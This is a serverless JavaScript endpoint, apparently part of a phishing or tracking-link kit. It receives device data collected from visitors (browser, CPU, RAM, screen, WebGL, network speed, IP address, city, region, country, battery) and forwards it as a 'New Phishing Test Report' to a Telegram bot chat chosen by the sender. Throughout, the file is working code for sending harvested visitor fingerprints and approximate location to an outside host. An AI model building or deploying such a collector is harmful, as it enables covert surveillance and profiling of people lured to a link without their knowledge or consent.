export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...deviceInfo } = req.body;
    
    // Build message sections dynamically
    const sections = [];
    
    // Always include these basic fields
    sections.push(
      `📡 *New Phishing Test Report*`,
      ``,
      `🆔 *Chat ID*: ${telegramId}`,
      `🕒 *Time*: ${new Date().toLocaleString()}`
    );
    
    // Basic Info
    const basicInfo = [];
    if (deviceInfo.browser) basicInfo.push(`- Browser: ${deviceInfo.browser}`);
    if (deviceInfo.platform) basicInfo.push(`- Platform: ${deviceInfo.platform}`);
    if (deviceInfo.language) basicInfo.push(`- Language: ${deviceInfo.language}`);
    if (deviceInfo.timezone) basicInfo.push(`- Timezone: ${deviceInfo.timezone}`);
    if (basicInfo.length) sections.push(`\n🌐 *Basic Info*`, ...basicInfo);
    
    // Hardware Info
    const hardwareInfo = [];
    if (deviceInfo.cpu) hardwareInfo.push(`- CPU: ${deviceInfo.cpu}`);
    if (deviceInfo.memory) hardwareInfo.push(`- RAM: ${deviceInfo.memory}`);
    if (deviceInfo.screen) hardwareInfo.push(`- Screen: ${deviceInfo.screen}`);
    if (deviceInfo.webgl?.vendor && deviceInfo.webgl?.renderer) {
      hardwareInfo.push(`- WebGL: ${deviceInfo.webgl.vendor} | ${deviceInfo.webgl.renderer}`);
    }
    if (hardwareInfo.length) sections.push(`\n💻 *Hardware*`, ...hardwareInfo);
    
    // Network Info
    const networkInfo = [];
    if (deviceInfo.network?.type) networkInfo.push(`- Type: ${deviceInfo.network.type}`);
    if (deviceInfo.network?.effectiveType) networkInfo.push(`- Speed: ${deviceInfo.network.effectiveType}`);
    if (deviceInfo.network?.downlink) networkInfo.push(`- Downlink: ${deviceInfo.network.downlink} Mbps`);
    if (deviceInfo.network?.rtt) networkInfo.push(`- Latency (RTT): ${deviceInfo.network.rtt} ms`);
    if (deviceInfo.network?.saveData !== undefined) {
      networkInfo.push(`- Data Saver: ${deviceInfo.network.saveData ? 'Enabled' : 'Disabled'}`);
    }
    if (networkInfo.length) sections.push(`\n📶 *Network*`, ...networkInfo);
    
    // Location Info
    const locationInfo = [];
    if (deviceInfo.ip) locationInfo.push(`- IP: ${deviceInfo.ip}`);
    if (deviceInfo.city) locationInfo.push(`- City: ${deviceInfo.city}`);
    if (deviceInfo.region) locationInfo.push(`- Region: ${deviceInfo.region}`);
    if (deviceInfo.country) locationInfo.push(`- Country: ${deviceInfo.country}`);
    if (locationInfo.length) {
      sections.push(`\n📍 *Approximate Location* (IP-based, not accurate)`);
      sections.push(...locationInfo);
    }
    
    // Battery Info
    const batteryInfo = [];
    if (deviceInfo.battery) batteryInfo.push(`- Level: ${deviceInfo.battery}%`);
    if (deviceInfo.charging !== undefined) {
      batteryInfo.push(`- Charging: ${deviceInfo.charging ? 'Yes' : 'No'}`);
    }
    if (batteryInfo.length) sections.push(`\n🔋 *Battery*`, ...batteryInfo);
    
    // Join all sections
    const messageText = sections.join('\n');
    
    // Send to Telegram
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });
    
    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
};
